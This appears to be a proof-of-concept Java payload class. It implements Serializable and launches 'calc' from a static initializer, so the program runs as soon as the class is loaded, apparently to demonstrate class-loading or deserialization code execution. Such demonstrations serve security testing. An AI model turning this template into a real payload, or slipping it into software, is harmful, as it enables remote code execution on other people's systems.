package industry.skills.logs.example.lookup;

import java.io.IOException;
import java.io.Serializable;

public class Goo implements Serializable {
    static {
        try {
            new ProcessBuilder("calc").start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
